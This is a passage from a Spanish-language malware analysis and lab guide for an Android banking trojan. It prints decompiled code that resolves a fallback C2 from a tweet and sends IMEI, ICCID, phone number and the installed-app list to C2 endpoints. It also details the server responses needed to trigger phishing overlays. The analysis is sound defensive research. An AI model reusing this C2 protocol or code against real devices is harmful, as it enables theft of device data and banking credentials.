+    } catch (Exception e) {
+    }
+
+    HttpsURLConnection httpsURLConnection =
+            (HttpsURLConnection) url.openConnection();
+    httpsURLConnection.setRequestMethod("GET");
+    httpsURLConnection.setUseCaches(false);
+    httpsURLConnection.setRequestProperty(
+            "Accept",
+            "text/html,application/xhtml+xml,application/xml,"
+            + "application/json;q=0.9,*/*;q=0.8");
+    httpsURLConnection.setRequestProperty(
+            "Accept-Language", "en-US,en;q=0.5");
+
+    if (httpsURLConnection.getResponseCode() != 200) {
+        throw new Exception("twitter response in NOT OK!");
+    }
+
+    // ... lectura del cuerpo y análisis del tuit
+}
+```
+
+La presencia de `https://` selecciona `HttpsURLConnection`; por tanto, antes del `GET` se producen la conexión TCP al puerto 443 y la negociación TLS. El código no elimina esa negociación, sino únicamente las comprobaciones de confianza y nombre del certificado.
+
+El código no llama a [`setInstanceFollowRedirects(false)`]{.content-visible unless-format="pdf"}[`\nolinkurl{setInstanceFollowRedirects(false)}`{=latex}]{.content-visible when-format="pdf"}. Por tanto, hereda el [comportamiento predeterminado de `HttpURLConnection`](https://developer.android.com/reference/java/net/HttpURLConnection), que permite seguir redirecciones HTTP automáticamente. La respuesta final que llega al código debe tener estado `200`.
+
+La consulta DNS, la sesión TCP y la negociación TLS son visibles en la red. El método, la ruta y el HTML de Twitter viajan cifrados dentro de TLS.
+
+La respuesta se concatena sin separadores de línea y se analiza como HTML. El analizador selecciona todos los elementos cuya clase incluya `tweet-text`, toma el primero mediante `get(0)`, obtiene su texto y aplica `trim()`. Una estructura mínima válida es:
+
+```html
+<html><body><p class="tweet-text">192.168 56.20</p></body></html>
+```
+
+Tiene que existir al menos un elemento de esa clase. En el flujo seleccionado su texto será exactamente `192.168 56.20`. Cualquier otro contenido de la página es irrelevante para la extracción. Esto permite emular la transacción con Twitter mediante una respuesta mínima.
+
+#### Reconstrucción del C2 alternativo
+
+El texto completo y ya recortado del primer elemento `tweet-text` debe satisfacer la expresión:
+
+```regex
+[0-9]{1,3}.[0-9]{1,3} [0-9]{1,3}.[0-9]{1,3}
+```
+
+En la expresión Java, los puntos no están escapados y, técnicamente, aceptan cualquier carácter. Sin embargo, la construcción posterior conserva esos caracteres dentro de cada mitad. Para obtener una dirección IPv4 válida y reproducir la intención de la muestra, el servidor debe usar puntos literales, un único espacio ASCII entre las dos mitades y ningún texto adicional:
+
+```text
+A.B C.D
+```
+
+El método `matches()` exige que coincida toda la cadena. Cada grupo admite entre uno y tres dígitos, pero el código no comprueba que cada octeto esté entre 0 y 255 ni aplica otra validación numérica.
+
+La aplicación separa el texto por el espacio, conserva `A.B` y `C.D`, inserta un punto entre ambas mitades y antepone `http://`:
+
+```text
+http://A.B.C.D
+```
+
+Finalmente añade el puerto:
+
+```text
+http://A.B.C.D:8060
+```
+
+Al sustituir los parámetros por la decisión del laboratorio, la transformación concreta es:
+
+```text
+192.168 56.20
+http://192.168.56.20
+http://192.168.56.20:8060
+```
+
+El mismo método `i()` enlaza la extracción HTML con la construcción del siguiente destino:
+
+```java
+a.a.b.f fVarE = ae.e(sb.toString());
+ae.f("tweet-text");
+String strTrim = a.a.d.a.a(
+        new a.a.d.d("tweet-text"), fVarE)
+        .get(0).k().trim();
+
+String str = "";
+if (strTrim.matches(
+        "[0-9]{1,3}.[0-9]{1,3} [0-9]{1,3}.[0-9]{1,3}")) {
+    str = "http://"
+            + strTrim.split(" ")[0]
+            + "."
+            + strTrim.split(" ")[1];
+}
+
+if ("".equals(str)) {
+    return "";
+}
+
+String str2 = str + ":8060";
+if (!"".equals(str2)
+        && !str2.equalsIgnoreCase(
+                com.kmc.prod.c.a.a(this.f35a).a())) {
+    a(str2);
+}
+```
+
+Aquí `sb` es el HTML recibido de Twitter, `strTrim` es el texto del primer elemento `tweet-text`, `str2` es la dirección completa con el puerto 8060 y la llamada ofuscada `a(str2)` inicia la validación `/ping`. No existe entre ambos puntos ninguna resolución de nombre: el texto se convierte directamente en una URL con una IPv4 literal.
+
+La dirección seleccionada, `192.168.56.20`, se utiliza directamente como destino de la conexión posterior. Al ser una IPv4 literal, este paso no genera una consulta DNS.
+
+#### Validación y persistencia del C2 alternativo
+
+Si el C2 reconstruido no es una cadena vacía y es distinto del dominio guardado, el resolver llama a la rutina de validación. Con los valores seleccionados, esta abre una conexión HTTP con `192.168.56.20:8060` y utiliza `/ping`, una ruta destinada únicamente a comprobar que el nuevo servidor responde:
+
+```http
+POST /ping HTTP/1.1
+Host: 192.168.56.20:8060
+Accept: text/html,application/xhtml+xml,application/xml,application/json;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 9
+
+cGluZw==\n
+```
+
+Los recursos y el método `a(String)` de `com.kmc.prod.d.a` confirman la ruta, la codificación y la condición que precede a la persistencia:
+
+```xml
+<string name="url_ydfs7fc348">ping</string>
+```
+
+```java
+private void a(String str) {
+    try {
+        String strEncodeToString =
+                Base64.encodeToString("ping".getBytes(), 0);
+        HttpURLConnection httpURLConnection =
+                (HttpURLConnection) new URL(
+                        str + "/"
+                        + this.f35a.getResources()
+                                .getString(R.string.url_ydfs7fc348))
+                        .openConnection();
+
+        httpURLConnection.setUseCaches(false);
+        httpURLConnection.setRequestMethod("POST");
+        httpURLConnection.setRequestProperty(
+                "Accept",
+                "text/html,application/xhtml+xml,application/xml,"
+                + "application/json;q=0.9,*/*;q=0.8");
+        httpURLConnection.setRequestProperty(
+                "Accept-Language", "en-US,en;q=0.5");
+        httpURLConnection.setRequestProperty(
+                "Connection", "keep-alive");
+        httpURLConnection.setRequestProperty(
+                "Content-Type", "application/json");
+        httpURLConnection.setRequestProperty(
+                "Content-Length",
+                Integer.toString(strEncodeToString.length()));
+        httpURLConnection.setDoOutput(true);
+        httpURLConnection.setDoInput(true);
+
+        DataOutputStream dataOutputStream =
+                new DataOutputStream(httpURLConnection.getOutputStream());
+        dataOutputStream.writeBytes(strEncodeToString);
+        dataOutputStream.flush();
+        dataOutputStream.close();
+
+        int responseCode = httpURLConnection.getResponseCode();
+        // ... lectura del cuerpo
+
+        if (responseCode != 200) {
+            throw new Exception("server response in NOT OK!");
+        }
+
+        SQLiteDatabase writableDatabase =
+                com.kmc.prod.c.a.a(this.f35a).getWritableDatabase();
+        ContentValues contentValues = new ContentValues();
+        contentValues.put("domain", str);
+        writableDatabase.update(
+                "currentCommand",
+                contentValues,
+                " id = ? ",
+                new String[]{"1"});
+        // ...
+    } catch (Exception e2) {
+        // ...
+    }
+}
+```
+
+En este método, `str` ya vale [`http://192.168.56.20:8060`]{.content-visible unless-format="pdf"}[`\nolinkurl{http://192.168.56.20:8060}`{=latex}]{.content-visible when-format="pdf"}. La concatenación con el recurso `ping` produce [`http://192.168.56.20:8060/ping`]{.content-visible unless-format="pdf"}[`\nolinkurl{http://192.168.56.20:8060/ping}`{=latex}]{.content-visible when-format="pdf"}. La actualización de `domain` está situada después de la comprobación `responseCode != 200`, lo que demuestra que una respuesta distinta de `200` no valida el destino.
+
+En la representación anterior, `\n` designa un único byte `LF` al final del cuerpo; no son dos caracteres visibles. La cadena `cGluZw==` es Base64 estándar con relleno para el texto ASCII `ping`. La longitud es nueve porque incluye ese `LF` producido por `Base64.DEFAULT`.
+
+El cliente lee y concatena el cuerpo de respuesta, pero no utiliza su contenido. Solo exige el código `200`; un cuerpo vacío es válido. Después, y solo después de ese éxito, actualiza la fila `id = 1` de `currentCommand`:
+
+```text
+domain = http://192.168.56.20:8060
+```
+
+La ruta `/ping` no cambia `uid`, no pone `isRegistered` a `1` y no inicia por sí misma las tareas de una víctima registrada. Su única función en este flujo es validar que el nuevo servidor responde y persistir el dominio. Si la validación falla, el dominio no se actualiza. Dos resoluciones concurrentes pueden alcanzar `/ping` antes de que una de ellas haya actualizado SQLite, por lo que el C2 puede recibir varias validaciones equivalentes.
+
+#### Reintento y asociación lógica con el C2 alternativo
+
+Cuando un resolver termina, también termina el hilo de registro que lo había iniciado contra `146.0.72.85:7878`. El intento de transmitir `POST /stbi` de ese hilo no se reanuda y la rutina no vuelve a invocarlo inmediatamente. En ese momento el estado compartido es:
+
+```text
+domain = http://192.168.56.20:8060
+isRegistered = NULL
+uid = NULL
+```
+
+La primera activación posterior de `SchedulerExecutor` que observe el nuevo dominio y encuentre todavía `isRegistered` a falso inicia otro hilo de registro. La misma rutina `DataRtmSender.g()` reconstruye los campos con los valores actuales del dispositivo y envía:
+
+```http
+POST /stbi HTTP/1.1
+Host: 192.168.56.20:8060
+Accept: text/html,application/xhtml+xml,application/xml,application/json;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: <longitud de BASE64_DEFAULT(JSON_REGISTRO)>
+
+<BASE64_DEFAULT(JSON_REGISTRO)>
+```
+
+El JSON contiene de nuevo `number`, `iccid`, `model`, `imei`, `os`, `control_number`, `type`, `lang` y `hash`. El cliente reconstruye el objeto en el momento del reintento con los valores actuales del dispositivo. Este segundo intento es el primero que llega a transmitir el registro por HTTP dentro del flujo seleccionado.
+
+Este registro contra el C2 alternativo no espera a que hayan terminado todos los hilos que todavía intentan contactar con la dirección primaria. Por tanto, el `POST /stbi` dirigido al puerto 8060 puede coincidir temporalmente con retransmisiones TCP hacia el puerto 7878 o con consultas duplicadas a TimeAPI y Twitter iniciadas por otros hilos.
+
+La muestra tampoco marca el registro contra el C2 alternativo como operación en curso. Si su respuesta tardase más que otro vencimiento del planificador, podría producirse más de un `POST /stbi` al puerto 8060. Cada respuesta satisfactoria volvería a ejecutar el manejador de registro, incluida la actualización de `getSmsList` y la llamada a `SchedulerExecutor.b`, por lo que también podría duplicar tareas posteriores. Para evitar esa rama en el escenario seleccionado, el servidor alternativo debe contestar antes del siguiente vencimiento de 20 segundos. Si aun así recibe un registro repetido ya iniciado, debe devolver el mismo `<BOT_ID_LAB>` para mantener coherente el estado.
+
+La condición de transporte es un código `200`. El cuerpo se lee por líneas y se concatena. El manejador `RegisterDeviceResponse` no busca `OK`: interpreta el cuerpo completo como identificador. Una respuesta aceptada por el manejador es:
+
+```text
+<BOT_ID_LAB>
+```
+
+Al procesarla, el manejador realiza estas acciones:
+
+1. Actualiza `uid = <BOT_ID_LAB>` e `isRegistered = 1`.
+2. Marca internamente `getSmsList = 1` y `getSmsListCommandExecuted = 0`. En consecuencia, el siguiente ciclo general intentará enviar la lista de SMS aunque esté vacía, como cabe esperar en el entorno emulado del laboratorio.
+3. Llama a [`SchedulerExecutor.b(context)`]{.content-visible unless-format="pdf"}[`\nolinkurl{SchedulerExecutor.b(context)}`{=latex}]{.content-visible when-format="pdf"}, que programa la detección de la aplicación en primer plano y la comprobación de plantillas.
+4. Deshabilita el componente de la actividad lanzadora.
+
+El manejador `com.kmc.prod.b.h`, recuperado con el nombre de compilación [`RegisterDeviceResponse.java`]{.content-visible unless-format="pdf"}[`\nolinkurl{RegisterDeviceResponse.java}`{=latex}]{.content-visible when-format="pdf"}, contiene esa transición:
+
+```java
+public final class h extends a {
+    @Override
+    public final void a(String str, Context context) {
+        this.f33a = context.getResources()
+                .getString(R.string.url_iscvdfi3);
+        com.kmc.prod.c.a.a(context).a(str);
+        com.kmc.prod.c.a.a(context).a(true);
+        SchedulerExecutor.b(context);
+        context.getPackageManager().setComponentEnabledSetting(
+                new ComponentName(
+                        context,
+                        (Class<?>) Lsf2v3Activity_dc3u3.class),
+                2,
+                1);
+        super.a(null, context);
+    }
+}
+```
+
+El parámetro `str` es el cuerpo concatenado de la respuesta a `/stbi`. La primera llamada a la base de datos lo guarda como `uid` y fija `isRegistered = 1`; la segunda activa `getSmsList`; y [`SchedulerExecutor.b(context)`]{.content-visible unless-format="pdf"}[`\nolinkurl{SchedulerExecutor.b(context)}`{=latex}]{.content-visible when-format="pdf"} inicia las tareas posteriores. El código no compara `str` con `OK`, de modo que `<BOT_ID_LAB>` debe suministrarse directamente como cuerpo.
+
+La validación `/ping` y este segundo `/stbi` son, por tanto, operaciones diferentes. Solo la segunda establece la asociación lógica y proporciona el `bot_id` usado en las solicitudes posteriores.
+
+#### Activación real de T1407
+
+#### Cadena de activación
+
+Después de aceptar el registro mediante `/stbi`, el manejador `RegisterDeviceResponse` marca el dispositivo como registrado y llama a [`SchedulerExecutor.b(context)`]{.content-visible unless-format="pdf"}[`\nolinkurl{SchedulerExecutor.b(context)}`{=latex}]{.content-visible when-format="pdf"}. Este método no envía todavía una petición al C2. Su función es activar dos comprobaciones locales que solo tienen sentido después del registro:
+
+- `NdiHandler` inicia la consulta del catálogo de plantillas. Cuando Android ejecuta este receptor, la cadena termina produciendo `POST /sban`.
+- `AfdxChecker` observa periódicamente qué aplicación está en primer plano. No descarga plantillas ni genera tráfico de red; una vez almacenada una plantilla, esta comprobación proporciona la condición local para mostrarla sobre la aplicación correspondiente.
+
+El escenario seleccionado utiliza Android 4.4, nivel de API 19. En esta versión, `SchedulerExecutor.b` registra dos alarmas repetitivas mediante `AlarmManager`:
+
+- La alarma de `AfdxChecker` puede ejecutarse inmediatamente y vuelve a vencer cada segundo.
+- La alarma de `NdiHandler` también puede ejecutarse inmediatamente y después vuelve a vencer cada 24 horas.
+
+El primer vencimiento es inmediato porque el segundo argumento de ambas llamadas a `setRepeating` es [`System.currentTimeMillis()`]{.content-visible unless-format="pdf"}[`\nolinkurl{System.currentTimeMillis()}`{=latex}]{.content-visible when-format="pdf"}, es decir, la hora actual. Esto no significa que ambos receptores se ejecuten de forma sincrónica ni en un orden fijo: significa que Android puede entregar las dos alarmas desde ese momento, sin esperar primero uno o veinticuatro intervalos.
+
+La rama correspondiente al nivel de API 19 es:
+
+```java
+public static void b(Context context) {
+    if (com.kmc.prod.c.a.a(context).e()) {
+        if (Build.VERSION.SDK_INT >= 22) {
+            // ... programación mediante RepeatedHadler
+            context.sendBroadcast(
+                    new Intent(context, (Class<?>) NdiHandler.class));
+            return;
+        }
+        ((AlarmManager) context.getSystemService("alarm"))
+                .setRepeating(
+                        0,
+                        System.currentTimeMillis(),
+                        1000L,
+                        PendingIntent.getBroadcast(
+                                context,
+                                0,
+                                new Intent(
+                                        context,
+                                        (Class<?>) AfdxChecker.class),
+                                0));
+        ((AlarmManager) context.getSystemService("alarm"))
+                .setRepeating(
+                        0,
+                        System.currentTimeMillis(),
+                        86400000L,
+                        PendingIntent.getBroadcast(
+                                context,
+                                0,
+                                new Intent(
+                                        context,
+                                        (Class<?>) NdiHandler.class),
+                                0));
+    }
+}
+```
+
+En las primeras ejecuciones de `AfdxChecker`, la base de datos todavía puede no contener ninguna plantilla, por lo que la comprobación termina sin mostrar nada. En cambio, el primer vencimiento de `NdiHandler` inicia el paso que interesa a nivel de red. Su método `onReceive()` crea un hilo de la clase interna [`com.kmc.prod.rprocessors_vvd3.c`]{.content-visible unless-format="pdf"}[`\nolinkurl{com.kmc.prod.rprocessors_vvd3.c}`{=latex}]{.content-visible when-format="pdf"}. Cuando el dispositivo tiene conectividad y la preferencia `handler["sban"]` no es verdadera, ese hilo llama a `DataRtmSender.h()`, que construye y transmite `POST /sban`.
+
+La cadena completa queda, por tanto, así:
+
+```text
+Registro /stbi aceptado
+SchedulerExecutor.b(context)
+AlarmManager programa la ejecución inmediata de NdiHandler
+Android ejecuta NdiHandler
+NdiHandler crea el hilo interno
+DataRtmSender.h()
+POST /sban
+```
+
+La consulta `/sban` no procede de una respuesta a `/sy`; se origina en la alarma local activada después del registro. De nuevo, esto demuestra que ambas operaciones se inician de forma independiente, aunque utilicen la misma dirección base del C2.
+
+En los niveles de API 22 o superiores la finalidad es la misma, pero cambia el mecanismo de temporización. `SchedulerExecutor.b` envía acciones a `RepeatedHadler`, que programa `AfdxChecker` en intervalos de 500 milisegundos y `NdiHandler` cada 24 horas. Además, el planificador envía una ejecución inmediata de `NdiHandler`. Esta rama se menciona para describir el código completo, pero no interviene en el escenario de nivel de API 19.
+
+La clase interna ofuscada [`com.kmc.prod.rprocessors_vvd3.c`]{.content-visible unless-format="pdf"}[`\nolinkurl{com.kmc.prod.rprocessors_vvd3.c}`{=latex}]{.content-visible when-format="pdf"}, recuperada de `NdiHandler.java`, realiza la llamada:
+
+```java
+public final void run() {
+    super.run();
+    while (!h.a(this.f48a).a()) {
+        try {
+            wait(15000L);
+        } catch (Exception e) {
+        }
+    }
+    if (!this.f48a.getSharedPreferences("handler", 0)
+            .getBoolean(
+                    this.f48a.getResources()
+                            .getString(R.string.url_dsivfu34),
+                    false)) {
+        com.kmc.prod.d.a.a(this.f48a).h();
+    }
+}
+```
+
+El recurso `url_dsivfu34` vale `sban`. En el estado limpio, `getBoolean(..., false)` devuelve falso y se ejecuta el método `h()` de `DataRtmSender`.
+
+La elección del nivel de API 19 es compatible con el nivel mínimo declarado por la APK, `minSdkVersion = 13`. También evita depender de una rutina de detección de procesos de versiones posteriores que JADX advierte que no ha reconstruido correctamente y que, por tanto, podría inducir a errores al implementar el laboratorio.
+
+#### Solicitud `/sban`
+
+El método `DataRtmSender.h()` enumera [`PackageManager.getInstalledApplications(128)`]{.content-visible unless-format="pdf"}[`\nolinkurl{PackageManager.getInstalledApplications(128)}`{=latex}]{.content-visible when-format="pdf"} y añade a `templates_names` todo paquete cuya [`ApplicationInfo.sourceDir`]{.content-visible unless-format="pdf"}[`\nolinkurl{ApplicationInfo.sourceDir}`{=latex}]{.content-visible when-format="pdf"} no contenga `/system/`. La matriz incluye aplicaciones instaladas por el usuario y normalmente la propia muestra; no es una lista histórica fija. La ejecución local posterior solo se alcanza si una plantilla guardada identifica una aplicación instalada que llegue a situarse en primer plano.
+
+Los recursos que identifican el catálogo y la descarga son:
+
+```xml
+<string name="url_dsivfu34">sban</string>
+<string name="url_sdugfv347f">gt</string>
+```
+
+Los dos métodos implicados aparecen en la misma clase ofuscada `com.kmc.prod.d.a`:
+
+```java
+public final void h() {
+    while (h.a(this.f35a).a()) {
+        try {
+            String string = this.f35a.getResources()
+                    .getString(R.string.url_dsivfu34);
+            JSONObject jSONObject = new JSONObject();
+            jSONObject.put("templates_names", k());
+            jSONObject.put(
+                    "bot_id",
+                    com.kmc.prod.c.a.a(this.f35a).d());
+            jSONObject.put("imei", ae.c(this.f35a));
+            jSONObject.put("type", string);
+            jSONObject.put(
+                    "lang",
+                    Locale.getDefault().getLanguage());
+            b(
+                    string,
+                    jSONObject.toString(),
+                    new com.kmc.prod.b.b());
+            return;
+        } catch (Exception e) {
+        }
+    }
+}
+
+private JSONArray k() {
+    JSONArray jSONArray = new JSONArray();
+    for (ApplicationInfo applicationInfo
+            : this.f35a.getPackageManager()
+                    .getInstalledApplications(128)) {
+        if (!applicationInfo.sourceDir.contains("/system/")) {
+            jSONArray.put(applicationInfo.packageName);
+        }
+    }
+    return jSONArray;
+}
+```
+
+El método `k()` no decide cuáles son aplicaciones bancarias: devuelve todos los nombres de paquete que superan el filtro de ruta. El servidor es quien puede comparar esa matriz con su catálogo. Es decir, en una máquina virtual sin aplicaciones bancarias, `/sban` se transmite igualmente y `templates_names` contiene las demás aplicaciones no situadas bajo `/system/`. Para completar el caso práctico, el operador debe elegir como `<PAQUETE_OBJETIVO>` una aplicación inocua instalada que pueda situarse en primer plano. Su nombre no debe terminar en el carácter `2`, porque el manejador reserva esa terminación para identificar el selector de la variante técnica y no procesaría esa clave como plantilla principal.
+
+El JSON es:
+
+```json
+{
+  "templates_names": ["<PAQUETE_USUARIO_1>", "<PAQUETE_OBJETIVO>", "..."],
+  "bot_id": "<BOT_ID_LAB>",
+  "imei": "<IMEI_DISPOSITIVO>",
+  "type": "sban",
+  "lang": "<IDIOMA_DISPOSITIVO>"
+}
+```
+
+Se envía con la siguiente estructura:
+
+```http
+POST /sban HTTP/1.1
+Host: 192.168.56.20:8060
+Accept: text/html,application/xhtml+xml,application/xml,application/json;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Content-Type: application/json
+
+<BASE64_DEFAULT(JSON_SBAN)>
+```
+
+La llamada `b(string, JSON, handler)` selecciona una segunda variante de la rutina HTTP general. Su código mantiene Base64 y las mismas cabeceras, pero no establece `Content-Length` de forma explícita:
+
+```java
+private void b(
+        String str,
+        String str2,
+        com.kmc.prod.b.i iVar) throws Exception {
+    try {
+        // ... comprobaciones de estado
+        String strEncodeToString =
+                Base64.encodeToString(str2.getBytes(), 0);
+        HttpURLConnection httpURLConnection =
+                (HttpURLConnection) new URL(
+                        com.kmc.prod.c.a.a(this.f35a).a()
+                        + "/" + str).openConnection();
+
+        httpURLConnection.setReadTimeout(30000);
+        httpURLConnection.setUseCaches(false);
+        httpURLConnection.setRequestMethod("POST");
+        httpURLConnection.setRequestProperty(
+                "Accept",
+                "text/html,application/xhtml+xml,application/xml,"
+                + "application/json;q=0.9,*/*;q=0.8");
+        httpURLConnection.setRequestProperty(
+                "Accept-Language", "en-US,en;q=0.5");
+        httpURLConnection.setRequestProperty(
+                "Connection", "keep-alive");
+        httpURLConnection.setRequestProperty(
+                "Content-Type", "application/json");
+        httpURLConnection.setDoOutput(true);
+        httpURLConnection.setDoInput(true);
+
+        DataOutputStream dataOutputStream =
+                new DataOutputStream(httpURLConnection.getOutputStream());
+        dataOutputStream.writeBytes(strEncodeToString);
+        dataOutputStream.flush();
+        dataOutputStream.close();
+
+        int responseCode = httpURLConnection.getResponseCode();
+        // ... lectura del cuerpo en sb
+
+        if (responseCode != 200) {
+            throw new Exception("server response in NOT OK!");
+        }
+        if (iVar != null) {
+            iVar.a(sb.toString(), this.f35a);
+        }
+    } catch (Exception e) {
+        // ... llamada al resolver y propagación
+    }
+}
+```
+
+Aquí `str` vale `sban`; por tanto, la URL es el `domain` persistido seguido de `/sban`. También el cuerpo real es Base64 estándar con relleno, líneas de 76 caracteres como máximo y `LF` final. Esta variante del método de envío no establece `Content-Length` expresamente; `HttpURLConnection` puede calcularlo o seleccionar otro modo de transferencia al materializar la solicitud. La respuesta debe tener código `200` y un cuerpo no vacío que sea un objeto JSON válido.
+
+#### Respuesta `/sban`
+
+El código HTTP 200 y la validez sintáctica del JSON solo satisfacen los requisitos de transporte y análisis. Para que el cliente descargue una plantilla, el cuerpo debe adoptar además la estructura de catálogo que espera el manejador. No se trata de una matriz ni de un objeto con un campo denominado `templates`: el propio objeto de nivel superior contiene una o más propiedades que describen las plantillas ofrecidas por el C2.
+
+Una respuesta mínima que ofrece una plantilla principal y su variante de trabajo técnico tiene esta forma:
+
+```json
+{
+  "<PAQUETE_OBJETIVO>": "<SELECTOR_PRINCIPAL>",
+  "<PAQUETE_OBJETIVO>2": "<SELECTOR_TECNICO>"
+}
+```
+
+El nombre de la primera propiedad, `<PAQUETE_OBJETIVO>`, identifica la plantilla y normalmente coincide con el nombre del paquete Android sobre el que se mostrará. Su valor, `<SELECTOR_PRINCIPAL>`, no es el documento HTML: es una cadena que la APK enviará posteriormente a `/gt` para solicitarlo. La segunda propiedad es opcional. Su nombre se obtiene añadiendo el carácter `2` al nombre principal y su valor es el selector utilizado para descargar la plantilla de trabajo técnico.
+
+Los selectores son valores proporcionados por el C2. El cliente no los interpreta como direcciones ni les exige una estructura interna antes de escribirlos como cuerpos de las solicitudes `/gt`. No hay evidencia en la muestra de cuáles fueron sus valores históricos.
+
+Una vez establecida esta estructura, el manejador recorre las propiedades del objeto:
+
+- Una clave que no termina en el carácter `2` identifica el nombre de la plantilla y, en la práctica prevista, el paquete de la aplicación objetivo.
+- El valor de esa clave se guarda temporalmente como cadena y se usa, sin interpretarlo como URL, como cuerpo de una solicitud posterior a `/gt`, la ruta que entrega el contenido de una plantilla concreta.
+- Si existe otra clave cuyo nombre sea la clave principal seguida de `2`, su valor se utiliza como cuerpo de una segunda solicitud a esa misma ruta `/gt`. La respuesta contiene una segunda variante de HTML que el código denomina plantilla de trabajo técnico y que puede mostrarse después de que el usuario ya haya introducido datos en la plantilla principal.
+- Las claves que ya terminan en `2` no inician por sí mismas una descarga principal.
+
+El manejador `com.kmc.prod.b.b`, recuperado con el nombre de compilación [`GetTemplatesResponseHandler_hfd63.java`]{.content-visible unless-format="pdf"}[`\nolinkurl{GetTemplatesResponseHandler_hfd63.java}`{=latex}]{.content-visible when-format="pdf"}, muestra esa interpretación:
+
+```java
+public final void a(String str, Context context) {
+    if (context == null) {
+        throw new RuntimeException("null context");
+    }
+    if (str == null || str.isEmpty()) {
+        throw new RuntimeException("bad template in response");
+    }
+    try {
+        JSONObject jSONObject = new JSONObject(str);
+        Iterator<String> itKeys = jSONObject.keys();
+        while (itKeys.hasNext()) {
+            String next = itKeys.next();
+            if (!next.endsWith("2")) {
+                String string = null;
+                if (jSONObject.has(next + "2")) {
+                    string = jSONObject.getString(next + "2");
+                }
+                com.kmc.prod.d.a.a(context).a(
+                        next,
+                        jSONObject.getString(next),
+                        string);
+            }
+        }
+        this.f33a = context.getResources()
+                .getString(R.string.url_dsivfu34);
+        super.a(str, context);
+    } catch (JSONException e) {
+        throw new RuntimeException("bad response");
+    }
+}
+```
+
+En el código, `next` es el nombre de la plantilla, [`jSONObject.getString(next)`]{.content-visible unless-format="pdf"}[`\nolinkurl{jSONObject.getString(next)}`{=latex}]{.content-visible when-format="pdf"} es el selector principal y `string` es el selector técnico opcional. La llamada `DataRtmSender.a(next, selector, selector2)` inicia la primera descarga. Si el servidor devolviera `{}`, el cuerpo seguiría siendo un objeto JSON válido, pero el iterador no tendría entradas y no se generaría ninguna solicitud `/gt`.
+
+#### Descarga principal mediante `/gt`
+
+Por cada clave principal, el manejador llama a una rutina distinta de la usada para las solicitudes C2 generales. La solicitud es:
+
+```http
+POST /gt HTTP/1.1
+Host: 192.168.56.20:8060
+Accept: text/html,application/xhtml+xml,application/xml,application/json;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: <longitud de SELECTOR_PRINCIPAL>
+
+<SELECTOR_PRINCIPAL>
+```
+
+La llamada anterior llega primero a este envoltorio:
+
+```java
+public final void a(String str, String str2, String str3) {
+    try {
+        a(
+                str2,
+                new com.kmc.prod.b.d(str, str3),
+                this.f35a.getString(R.string.url_sdugfv347f));
+    } catch (Exception e) {
+    }
+}
+```
+
+El recurso `url_sdugfv347f` vale `gt`. En este punto, `str` es el nombre de la plantilla, `str2` es el selector principal y `str3` es el selector técnico opcional. El envoltorio entrega el selector principal a una variante privada del método de envío utilizada para las descargas `/gt`.
+
+Esta variante continúa realizando un `POST` HTTP contra la dirección base del mismo C2 y conserva las principales cabeceras de las demás solicitudes. La diferencia respecto de `/stbi`, `/sban`, `/sy` y otras rutas está en la preparación del cuerpo. Esas operaciones construyen un objeto JSON y la rutina general lo codifica mediante `Base64.DEFAULT`; `/gt` recibe directamente el selector obtenido de `/sban` y lo escribe sin Base64. El código de esta variante es:
+
+```java
+private void a(
+        String str,
+        com.kmc.prod.b.i iVar,
+        String str2) throws Exception {
+    // ... comprobaciones de estado y conectividad
+    HttpURLConnection httpURLConnection =
+            (HttpURLConnection) new URL(
+                    com.kmc.prod.c.a.a(this.f35a).a()
+                    + "/" + str2).openConnection();
+
+    httpURLConnection.setUseCaches(false);
+    httpURLConnection.setRequestMethod("POST");
+    httpURLConnection.setRequestProperty(
+            "Accept",
+            "text/html,application/xhtml+xml,application/xml,"
+            + "application/json;q=0.9,*/*;q=0.8");
+    httpURLConnection.setRequestProperty(
+            "Accept-Language", "en-US,en;q=0.5");
+    httpURLConnection.setRequestProperty(
+            "Connection", "keep-alive");
+    httpURLConnection.setRequestProperty(
+            "Content-Type", "application/json");
+    httpURLConnection.setRequestProperty(
+            "Content-Length", Integer.toString(str.length()));
+    httpURLConnection.setDoOutput(true);
+    httpURLConnection.setDoInput(true);
+
+    DataOutputStream dataOutputStream =
+            new DataOutputStream(httpURLConnection.getOutputStream());
+    dataOutputStream.writeBytes(str);
+    dataOutputStream.flush();
+    dataOutputStream.close();
+
+    int responseCode = httpURLConnection.getResponseCode();
+    // ... lectura del cuerpo en sb
+    String string = sb.toString();
+
+    if (responseCode != 200) {
+        throw new Exception("server response in NOT OK!");
+    }
+    if (string.isEmpty()) {
+        throw new Exception(
+                "server response empty data for second request");
+    }
+    iVar.a(string, this.f35a);
+}
+```
+
+En el método privado, el parámetro `str` ya no es una ruta: es el selector recibido de `/sban`. El parámetro `str2` vale `gt` y forma la URL. La ausencia de `Base64.encodeToString` y la escritura directa mediante [`DataOutputStream.writeBytes(str)`]{.content-visible unless-format="pdf"}[`\nolinkurl{DataOutputStream.writeBytes(str)}`{=latex}]{.content-visible when-format="pdf"} confirman la diferencia descrita: el selector no se serializa de nuevo como JSON ni se codifica en Base64; lo que cambia es el contenido enviado, no el protocolo HTTP ni el destino C2.
+
+El cuerpo de la respuesta al primer `/gt` es la plantilla HTML principal. Sin embargo, el malware no valida que la cadena recibida sea realmente HTML. La rutina de red solo exige un código `200` y un cuerpo no vacío; el manejador vuelve a comprobar únicamente que la cadena no sea nula ni esté vacía. No utiliza un analizador HTML, no busca etiquetas obligatorias, no valida JavaScript, no exige `DOCTYPE` y tampoco consulta el tipo de contenido de la respuesta.
+
+Por tanto, cualquier cadena no vacía puede llegar a la base de datos, pero el servidor de laboratorio sí debe devolver un documento HTML utilizable para recorrer el comportamiento seleccionado. Más adelante, `CdwActivity_uce4` recupera la cadena y llama a `WebView.loadData(..., "text/html; charset=utf-8", "UTF-8")`; es en ese momento cuando el motor del `WebView` la interpreta como HTML.
+
+Una plantilla principal mínima, autocontenida y expresamente creada para el laboratorio puede ser:
+
+```html
